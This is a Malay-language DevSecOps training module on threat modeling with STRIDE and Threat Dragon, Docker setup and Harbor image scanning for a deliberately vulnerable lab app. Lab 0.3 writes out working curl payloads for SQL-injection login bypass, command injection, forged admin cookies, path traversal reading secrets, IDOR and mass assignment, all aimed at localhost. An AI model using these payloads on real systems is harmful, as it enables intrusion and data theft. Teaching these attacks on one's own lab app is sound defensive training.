# Modul 0: Pengenalan DevSecOps dan threat modeling

**Hari 1, 9:00 pagi hingga 1:00 petang**

Dalam modul ini anda akan:

1. Faham apa itu DevSecOps, shift-left dan quality gate, dan kenapa kontena serta kod yang dijana AI mengubah risiko.
2. Kenal lima jenis imbasan dan di mana setiap satu berada dalam pipeline.
3. Membaca dan memahami **threat model** untuk app Kedai Bengkel, yang dibina daripada gambar rajah aliran data dan STRIDE.
4. Menjalankan app lab dan **mengeksploit** tiga kelemahan secara manual, supaya anda tahu apa yang imbasan sepatutnya tangkap.

> Prasyarat: bahagian [Persediaan](../00-persediaan/README.md) siap, terutama Docker dan repo lab.

## Jadual

| Masa | Aktiviti |
|---|---|
| 9:00 – 10:00 | Slaid: DevSecOps, kontena, AI, lima jenis imbasan |
| 10:00 – 10:15 | Rehat |
| 10:15 – 11:30 | Teori threat modeling dan Makmal 0.1 |
| 11:30 – 12:30 | Makmal 0.2 dan 0.3: jalankan app, eksploit manual |
| 12:30 – 1:00 | Makmal 0.4: semak Harbor dan alat |

---

## Teori ringkas

### DevSecOps dan shift-left

**DevSecOps** menjadikan keselamatan tanggungjawab bersama sepanjang kitaran pembangunan, bukan semakan akhir oleh pasukan lain. **Shift-left** bermaksud mengalihkan pemeriksaan ke peringkat awal (ke kiri pada garis masa): kelemahan yang ditemui semasa commit memakan masa minit untuk dibaiki; yang ditemui di produksi memakan hari, dan kadang-kadang melibatkan insiden.

Sebuah **quality gate** ialah syarat automatik dalam pipeline: jika imbasan menemui sesuatu yang melebihi had yang ditetapkan, pipeline gagal dan perubahan tidak bergerak ke hadapan.

<div data-fig="lima-imbasan"></div>

| Imbasan | Soalan yang dijawab | Contoh dalam bengkel |
|---|---|---|
| **Secret Detection** | Adakah ada kata laluan atau kunci dalam kod dan sejarah git? | Gitleaks |
| **SAST** | Adakah kod sumber mengandungi corak yang tidak selamat? | Semgrep |
| **SCA** | Adakah pakej pihak ketiga ada kerentanan yang diketahui? | Trivy, `dotnet list package`, `composer audit` |
| **IaC** | Adakah Dockerfile, manifest K8s dan Terraform tidak selamat? | Trivy config, Checkov, hadolint, kube-linter |
| **DAST** | Adakah app yang sedang berjalan boleh diserang? | ZAP |

Tiada satu pun yang cukup sendirian. Dalam bengkel ini anda akan melihat dengan data sebenar apa yang setiap alat tangkap dan terlepas.

### Di mana setiap alat berjalan

Alat yang sama berjalan di **dua tempat**, dengan tujuan berbeza:

<div data-fig="alat-di-mana"></div>

| | Laptop anda | Server Linode |
|---|---|---|
| **Siapa yang menjalankan** | Anda, dengan menaip arahan (atau hook semasa `git commit`) | GitLab Runner, secara automatik selepas setiap `git push` |
| **Alat** | Git, pre-commit hook, kontena imbasan (`alat.sh`), app lab, kluster k3d | GitLab, GitLab Runner, Harbor (dengan scanner Trivy) |
| **Tujuan** | Belajar, dan maklum balas pantas sebelum kod keluar dari laptop | Pintu yang menyekat kod berisiko, walaupun pembangun terlupa atau melangkau semakan setempat |
| **Boleh dielak?** | Ya (`--no-verify`, `SKIP=`, tidak menjalankan imbasan) | Tidak, jika `main` dilindungi dan "Pipelines must succeed" dihidupkan (Modul 6) |
| **Bahan dalam bengkel** | Modul 1 hingga 5, dan 7 | Modul 4 (Harbor) dan Modul 6 (pipeline) |

Tiada alat imbasan yang dipasang pada laptop: setiap satu ialah kontena Docker yang dipanggil melalui fungsi dalam `alat.sh`, dan versi yang sama digunakan oleh pipeline di server. Maka alat dan versinya sama di kedua-dua tempat; perbezaan keputusan biasanya datang daripada fail yang diimbas (contohnya fail yang belum di-commit hanya wujud di laptop).

### Kenapa kontena dan AI mengubah risiko

- **Kontena** membungkus app bersama OS dan pakejnya. Satu image membawa ratusan pakej yang anda tidak tulis. Image lama atau berasaskan SDK membawa kerentanan, dan konfigurasi runtime (root, privileged) menentukan seberapa buruk kesan jika app dieksploit.
- **Kod yang dijana AI** ditulis laju dan kelihatan betul. Ia boleh mengandungi corak tidak selamat (SQL digabung dengan rentetan), dan boleh mencadangkan **pakej yang tidak wujud** atau yang diambil alih penyerang. Kelajuan menulis tidak menambah kelajuan menyemak, jadi imbasan automatik menjadi lebih penting, bukan kurang.
- **Aplikasi yang menggunakan LLM** menambah kelas risiko baharu (prompt injection, kebocoran data melalui prompt). OWASP Top 10 for LLM Applications ialah rujukan permulaan. Ia di luar skop makmal, tetapi ancaman dalam senarai itu dimodelkan dengan cara yang sama seperti di bawah.

### Threat modeling

Threat modeling ialah cara berfikir sistematik tentang apa yang boleh salah **sebelum** menulis atau mengimbas kod. Ia menjawab empat soalan:

1. **Apa yang kita bina?** Lukis gambar rajah aliran data (DFD).
2. **Apa yang boleh jadi salah?** Gunakan STRIDE pada setiap aliran dan komponen.
3. **Apa yang kita buat tentangnya?** Kurangkan, pindahkan, terima atau elakkan.
4. **Adakah kita buat dengan baik?** Sahkan dengan ujian dan imbasan.

Elemen DFD: **entiti luar** (pengguna), **proses** (app), **simpanan data** (DB, fail), **aliran data** (anak panah), dan **sempadan kepercayaan** (garis yang dilalui data apabila berpindah antara tahap kepercayaan berbeza). Ancaman paling banyak berlaku pada anak panah yang **merentas sempadan**.

**STRIDE** ialah senarai semak enam jenis ancaman:

| Huruf | Ancaman | Sifat yang dilanggar | Contoh dalam Kedai Bengkel |
|---|---|---|---|
| S | Spoofing | Pengesahan | Memalsukan cookie `session` untuk jadi admin |
| T | Tampering | Integriti | SQL injection mengubah query |
| R | Repudiation | Tidak boleh disangkal | Tiada log siapa menulis dalam buku pelawat |
| I | Information disclosure | Kerahsiaan | Path traversal membaca `appsettings.json` atau `.env` |
| D | Denial of service | Ketersediaan | `ping` tanpa had mengunci proses |
| E | Elevation of privilege | Kebenaran | Command injection menjalankan arahan sebagai root |

<div data-fig="dfd-kedai"></div>

---

## Makmal 0.1: Threat model Kedai Bengkel

**Tujuan.** Melihat bagaimana ancaman dikenal pasti daripada gambar rajah aliran data (DFD) sebelum melihat satu pun hasil imbasan, supaya anda tahu **bahasa** yang digunakan untuk menilai temuan dalam modul seterusnya.

**Masa.** Bahagian A (membaca jadual dan berbincang): 20 minit. Bahagian B (Threat Dragon) ialah **pilihan** dan memerlukan kira-kira 30 minit tambahan: lakukan jika masa mengizinkan, atau selepas bengkel.

### Bahagian A: jadual ancaman Kedai Bengkel

Rujuk rajah DFD di atas. Jadual di bawah ialah **threat model yang lengkap** untuk app Kedai Bengkel. Anda tidak perlu mengisinya: tugas anda ialah **membacanya** dan memahami bagaimana setiap baris dihasilkan. Setiap baris ialah satu ancaman:

| # | Aliran / komponen | STRIDE | Ancaman | Kawalan |
|---|---|---|---|---|
| 1 | Pengguna → App `/login` | T, S | SQL injection melepasi log masuk | Query berparameter, hash kata laluan yang kuat (bukan MD5) |
| 2 | Pengguna → App `/search` | T, I | SQL injection membaca jadual `users` | Query berparameter |
| 3 | Pengguna → App `/search`, `/ping` | T | XSS pantulan | Output encoding, CSP |
| 4 | Pengguna → App `/guestbook` | T, R | XSS tersimpan, tiada CSRF, tiada log pengarang | Encoding, token CSRF, log audit |
| 5 | App → Proses OS `/ping` | E | Command injection (jalan sebagai root) | Jangan guna shell, senarai hujah, validasi, pengguna bukan root |
| 6 | App → Sistem fail `/download` | I | Path traversal membaca konfigurasi dan secret | Normalisasi laluan, senarai putih |
| 7 | Admin → App `/admin` | S, E | Cookie base64 boleh dipalsukan | Sesi ditandatangani/disulitkan di server |
| 8 | `/api/users/{id}` | I | IDOR dan hash kata laluan didedahkan | Semakan kebenaran, jangan pulangkan hash |
| 9 | Pipeline → Image → Kluster | T | Image atau pakej dirosakkan | Imbasan SCA/image, tandatangan image (Modul 6) |

**Cara membaca jadual.** Anda tidak memerlukan latar belakang keselamatan:

- **Aliran / komponen**: di mana dalam rajah masalah itu berlaku, biasanya pada anak panah yang membawa data daripada pengguna ke dalam app.
- **STRIDE**: huruf jenis ancaman daripada jadual di atas. Satu baris boleh mempunyai lebih daripada satu huruf.
- **Ancaman**: apa yang penyerang boleh lakukan, dalam bahasa mudah.
- **Kawalan**: apa yang pembangun patut lakukan untuk menghalangnya. Dalam bengkel ini, setiap kawalan akan anda lihat atau gunakan.

**Contoh baris 1.** Pengguna menaip nama pengguna dan kata laluan pada halaman `/login`. App menyambung teks itu terus ke dalam arahan SQL. Penyerang menaip `admin'--` sebagai nama pengguna, dan tanda `--` menjadikan semakan kata laluan sebagai komen, jadi log masuk berjaya tanpa kata laluan. Itu **T** (Tampering: query diubah) dan **S** (Spoofing: berpura-pura menjadi admin). Kawalannya ialah query berparameter, yang memisahkan arahan SQL daripada data pengguna.

**Perbincangan** (berpasangan, beberapa minit; tiada jawapan bertulis):

1. Aliran mana dalam jadual yang merentas sempadan kepercayaan (daripada pengguna ke dalam app)? Kenapa ancaman paling banyak di situ?
2. Apa yang berlaku jika data daripada pengguna sampai ke **shell**, **sistem fail** atau **pangkalan data**? Cari baris yang sepadan.
3. Apa yang menentukan bahawa seseorang itu admin dalam app ini? Boleh dipalsukan? (Baris 7.)
4. Baris 9 ialah ancaman di sekeliling app (image, pipeline, kluster) yang tiada dalam rajah asal. Apa lagi yang boleh berlaku di situ?

Perhatikan bahawa kebanyakan baris ini akan muncul semula sebagai temuan imbasan dalam modul seterusnya. Threat model memberi anda **bahasa** untuk menilai temuan itu.

### Bahagian B (Pilihan): masukkan ke OWASP Threat Dragon

Bahagian ini **pilihan**. Anda boleh terus ke Makmal 0.2 tanpanya, dan kembali kemudian. Jadual di bahagian A dan Threat Dragon menghasilkan maklumat yang sama; Threat Dragon hanya menyimpannya sebagai fail yang boleh disemak dalam git.

<details class="pilihan" markdown="1">
<summary>Tunjuk Bahagian B: OWASP Threat Dragon (pilihan, ≈ 30 minit)</summary>

[OWASP Threat Dragon](https://www.threatdragon.com/) ialah alat sumber terbuka untuk melukis DFD dan merekod ancaman bagi setiap unsur. Model disimpan sebagai **satu fail JSON**, jadi ia boleh dimasukkan dalam repo, disemak dalam pull request dan dikemas kini apabila reka bentuk berubah. Inilah maksud "threat model sebagai kod". Jika pemasangan gagal, siapkan bahagian A sahaja.

**Langkah 1: simpan fail model dalam satu folder.** Model ialah dua fail JSON. Fail pertama, `kedai-bengkel-kosong.json` (rajah tanpa ancaman, untuk anda isi), dipaparkan di bawah. Fail kedua, `kedai-bengkel-jawapan.json` (kunci jawapan), ada dalam bahagian **Fail modul** di hujung modul ini dan anda menggunakannya pada akhir latihan supaya jawapan tidak kelihatan lebih awal.

<div data-file="modul-0-pengenalan/kedai-bengkel-kosong.json"></div>

Threat Dragon dipasang di Windows, jadi simpan fail dalam folder Windows: `Documents\model-ancaman`. Dalam terminal Ubuntu (fail ini ada dalam klon `~/um-devsecops` daripada Persediaan 2):

```bash
W=$(wslpath "$(powershell.exe -NoProfile -Command '[Environment]::GetFolderPath("MyDocuments")' | tr -d '\r')")
mkdir -p "$W/model-ancaman"
cp ~/um-devsecops/devsecops-tutorial/modul-0-pengenalan/kedai-bengkel-kosong.json "$W/model-ancaman/"
ls "$W/model-ancaman"
```

`ls` mesti menunjukkan `kedai-bengkel-kosong.json`. Anda kini boleh melihat folder itu dalam Windows Explorer di `Documents\model-ancaman`.

Jika klon `~/um-devsecops` tiada, salin kandungan fail di atas (butang **Salin**), tampal dalam Notepad dan simpan sebagai `kedai-bengkel-kosong.json` dalam folder `Documents\model-ancaman`, dengan **Save as type: All files** dan **Encoding: UTF-8**.

**Langkah 2: pasang Threat Dragon (di Windows, bukan dalam WSL).** Muat turun `Threat-Dragon-ng-Setup-2.6.2.exe` (≈ 154 MB) daripada [halaman release](https://github.com/OWASP/threat-dragon/releases) dan jalankan pemasang. Pilih versi desktop: ia menyimpan fail di laptop anda, tanpa log masuk GitHub dan tanpa Docker. Versi ini kami tulis semasa tutorial dibina; jika halaman release sudah ada versi lebih baharu, pilih yang stabil terkini.

**Langkah 3: buka model.** Dalam Threat Dragon:

1. Pada halaman Welcome, klik kawasan **open**. Skrin **Open / Import existing** terbuka, dengan kotak teks besar.
2. Klik butang **Open** (ikon folder, di bawah kiri kotak teks) dan pilih `Documents\model-ancaman\kedai-bengkel-kosong.json`. Anda juga boleh menyeret fail itu dari Windows Explorer ke dalam kotak teks.
3. Klik **Aliran data utama** (nama rajah) untuk membuka penyunting rajah. Anda akan melihat DFD yang sama seperti di atas: dua entiti luar, app, proses OS, pangkalan data, sistem fail dan garis sempadan kepercayaan.

> **Jangan tampal JSON ke dalam kotak teks dan klik Import.** Pada Threat Dragon 2.6.2 (desktop) cara itu memberi `Error: An object could not be cloned`: kami menemuinya semasa menjalankan tutorial ini, dan kod sumber menunjukkan butang Import menghantar peristiwa klik, bukan nama fail, kepada aplikasi desktop, yang tidak dapat menyalinnya. Butang **Open** dan seret-lepas fail menghantar nama fail dan tidak terkesan. Jika versi lebih baharu membetulkannya, kedua-dua cara akan berfungsi.

**Tambah ancaman.**

1. Klik satu unsur, contohnya anak panah **Permintaan pengguna**. Sifat unsur dan ancamannya muncul di panel bawah.
2. Klik **New Threat**. Isi **Title**, pilih **Threat Type** (enam jenis STRIDE), **Severity**, tulis **Description** dan **Mitigations**, kemudian klik **Apply**.
3. Ulang sehingga anda telah memindahkan sekurang-kurangnya **enam** baris daripada jadual di bahagian A sebagai ancaman (tajuk, jenis STRIDE dan kawalan boleh disalin daripada jadual). Sempadan kepercayaan tidak boleh mempunyai ancaman; letakkan ancaman pada anak panah yang merentasinya.
4. Klik **Save**. Jika aplikasi meminta lokasi fail, simpan dalam folder `Documents\model-ancaman`. Fail JSON anda kini mengandungi semua ancaman.

**Ukur dengan kunci jawapan.** Salin fail kunci jawapan ke folder yang sama (dalam terminal Ubuntu; takrifkan `W` semula jika terminal baharu):

```bash
W=$(wslpath "$(powershell.exe -NoProfile -Command '[Environment]::GetFolderPath("MyDocuments")' | tr -d '\r')")
cp ~/um-devsecops/devsecops-tutorial/modul-0-pengenalan/kedai-bengkel-jawapan.json "$W/model-ancaman/"
```

Kemudian buka `kedai-bengkel-jawapan.json` dalam Threat Dragon dengan butang **Open** seperti Langkah 3 dan bandingkan. Ia mengandungi kesemua sembilan ancaman, sepadan dengan jadual di bahagian A. Soalan perbincangan:

- Ancaman mana yang anda lihat tetapi kunci jawapan tiada? Itu mungkin ancaman sebenar yang kami terlepas.
- Ancaman mana yang boleh dikesan oleh imbasan (SAST, DAST, SCA) dan mana yang tidak? Tulis di sebelah setiap ancaman; jawapannya akan menjadi jelas apabila anda melihat hasil imbasan dalam modul seterusnya.

> Nama jenis dan butang di atas diambil daripada dokumentasi rasmi Threat Dragon 2.x. Antara muka boleh berbeza sedikit mengikut versi.

</details>

---

## Makmal 0.2: Jalankan app lab

**Tujuan.** Pastikan app anda berjalan, dan fahami bahawa imbasan yang akan anda jalankan menyasarkan app yang sebenar.

<div class="trk trk-a" markdown="1">

```bash
cd ~/devsecops-lab
docker buildx build --provenance=false --sbom=false --load -t aspnet-app:latest aspnet-app
docker run -d --name kedai -p 8080:8080 aspnet-app:latest
sleep 5
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080/
```

Binaan pertama ≈ 1 minit. Jawapan `200` bermakna app berjalan; buka <http://localhost:8080> dalam pelayar.

</div>

<div class="trk trk-b" markdown="1">

```bash
cd ~/devsecops-lab
docker buildx build --provenance=false --sbom=false --load -t laravel-app:latest laravel-app
docker run -d --name kedai -p 8081:8080 laravel-app:latest
sleep 8
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8081/
```

Binaan pertama ≈ 2 minit kerana Composer memuat turun dependency. Jawapan `200` bermakna app berjalan; buka <http://localhost:8081>.

</div>

> `--provenance=false --sbom=false` menghalang Docker menambah attestation pada image. Kita perlukan ini pada Modul 4 supaya polisi Harbor berfungsi. Biasakan diri menggunakannya.

---

## Makmal 0.3: Eksploit manual

**Tujuan.** Rasa sendiri kesan tiga kelemahan. Ini ialah **sebab** kita mengimbas.

Ini dibenarkan kerana app ialah milik anda dan berjalan pada laptop anda sendiri.

<div class="trk trk-a" markdown="1">

Tetapkan alamat app:

```bash
APP=http://localhost:8080
```

**1. SQL injection melepasi log masuk.** Cuba kata laluan salah dahulu, kemudian suntik:

```bash
curl -s -X POST $APP/login --data-urlencode "username=admin" --data-urlencode "password=salah" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
curl -s -X POST $APP/login --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
```

**2. Command injection.** Ping biasa, kemudian sambung arahan:

```bash
curl -s "$APP/ping?host=127.0.0.1" | grep -oE "bytes from"
curl -s "$APP/ping?host=127.0.0.1;id" | grep -oE "uid=[^<]*"
```

**3. Cookie sesi boleh dipalsukan.** Cookie hanyalah `nama:peranan` dalam base64:

```bash
curl -s -o /dev/null -w "tanpa cookie: %{http_code}\n" $APP/admin
curl -s -H "Cookie: session=$(printf 'sesiapa:admin' | base64)" $APP/admin | grep -oE "Akses ditolak|Panel admin"
```

Bonus: path traversal dan IDOR.

```bash
curl -s "$APP/download?file=../appsettings.json" | head -12
curl -s $APP/api/users/1
```

</div>

<div class="trk trk-b" markdown="1">

Tetapkan alamat app:

```bash
APP=http://localhost:8081
```

**1. SQL injection melepasi log masuk.** Cuba kata laluan salah dahulu, kemudian suntik:

```bash
curl -s -X POST $APP/login --data-urlencode "username=admin" --data-urlencode "password=salah" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
curl -s -X POST $APP/login --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
```

**2. Command injection.** Ping biasa, kemudian sambung arahan:

```bash
curl -s "$APP/ping?host=127.0.0.1" | grep -oE "bytes from"
curl -s "$APP/ping?host=127.0.0.1;id" | grep -oE "uid=[^<]*"
```

**3. Cookie sesi boleh dipalsukan.** Cookie hanyalah `nama:peranan` dalam base64:

```bash
curl -s -o /dev/null -w "tanpa cookie: %{http_code}\n" $APP/admin
curl -s -H "Cookie: session=$(printf 'sesiapa:admin' | base64)" $APP/admin | grep -oE "Akses ditolak|Panel admin"
```

Bonus: path traversal (fail `.env` mengandungi `APP_KEY`), IDOR dan mass assignment.

```bash
curl -s "$APP/download?file=../.env" | head -5
curl -s $APP/api/users/1
curl -s -X POST $APP/api/profile/2 -d "role=admin"
```

</div>

Kenal pasti: bagi setiap serangan, apa yang STRIDE kata? Padankan dengan baris dalam jadual threat model di Makmal 0.1.

<details>
<summary>Jawapan jangkaan</summary>

- Kata laluan salah memberi `Log masuk gagal`; `admin'--` memberi `Selamat datang, admin` (komen SQL `--` memotong semakan kata laluan).
- `;id` memberi `uid=0(root) gid=0(root)`: arahan dijalankan sebagai root dalam kontena.
- Tanpa cookie halaman memaparkan `Akses ditolak` (kod 200 pada ASP.NET, 403 pada Laravel); dengan cookie palsu `Panel admin`.
- `/api/users/1` memulangkan rekod admin termasuk hash MD5 kata laluan.
</details>

---

## Makmal 0.4: Semak Harbor dan alat

**Tujuan.** Sahkan akses ke Harbor sebelum modul berasaskan imej pada Hari 3.

Tetapkan nombor anda (contoh `peserta03`) sekali sahaja untuk sesi ini:

```bash
P=peserta03
docker login harbor.lab.test -u $P
```

<div class="trk trk-a" markdown="1">

```bash
docker tag aspnet-app:latest harbor.lab.test/$P/aspnet-app:uji
docker push harbor.lab.test/$P/aspnet-app:uji
```

</div>

<div class="trk trk-b" markdown="1">

```bash
docker tag laravel-app:latest harbor.lab.test/$P/laravel-app:uji
docker push harbor.lab.test/$P/laravel-app:uji
```

</div>

### Lihat keputusan imbasan di Harbor

Buka <https://harbor.lab.test> dalam pelayar dan log masuk sebagai `pesertaNN`. Kemudian:

1. Klik **Projects**, kemudian projek anda (`pesertaNN`).
2. Dalam tab **Repositories**, klik nama repositori (contohnya `pesertaNN/aspnet-app`).
3. Anda melihat senarai **Artifacts**, satu baris bagi setiap tag atau digest. Lajur **Vulnerabilities** menunjukkan ringkasan imbasan: bilangan kerentanan mengikut tahap (Critical, High, Medium, Low). Harbor mengimbas secara automatik selepas push, jadi tunggu beberapa saat; jika lajur masih menunjukkan status belum selesai, muat semula halaman.
4. Klik **digest** artifact (teks yang bermula dengan `sha256:`) untuk membuka butirannya. Bahagian **Vulnerabilities** menyenaraikan setiap CVE dengan pakej yang terlibat, versi yang dipasang dan versi yang membaikinya (*Fixed in*).
5. Jika artifact belum diimbas, tandakan baris itu dalam senarai Artifacts dan klik **Scan**.

Imej lab ini sengaja dibina tanpa pembaikan, jadi jangan terkejut jika ia mempunyai banyak kerentanan. Untuk sekarang kita hanya mahu melihat bahawa imbasan berlaku. Cara membaiki dan menyekat imej berisiko dibincangkan di Modul 4. Imbasan ini dibuat oleh Trivy **di dalam Harbor**, yang berbeza daripada Trivy yang anda jalankan di laptop: lihat perbandingan dalam Modul 4, bahagian "Trivy di laptop dan Trivy di Harbor".

Hentikan app:

```bash
docker rm -f kedai
```

## Senarai semak Modul 0

- [ ] Saya boleh menerangkan shift-left dan quality gate dengan ayat sendiri
- [ ] Saya boleh membaca jadual threat model dan menerangkan satu baris: aliran, jenis STRIDE, ancaman dan kawalan
- [ ] (Pilihan) Saya sudah membuka model dalam Threat Dragon dan menambah ancaman
- [ ] App saya berjalan dan saya berjaya mengeksploit tiga kelemahan
- [ ] Saya berjaya push image ke projek Harbor saya dan melihat hasil imbasannya
- [ ] Saya tahu STRIDE huruf mana untuk setiap serangan tadi

## Rujukan

- OWASP Threat Modeling: <https://owasp.org/www-community/Threat_Modeling>
- OWASP Threat Dragon: <https://owasp.org/www-project-threat-dragon/> dan dokumentasi <https://www.threatdragon.com/docs/>
- OWASP Top 10: <https://owasp.org/Top10/>
- OWASP Top 10 for LLM Applications: <https://genai.owasp.org/llm-top-10/>
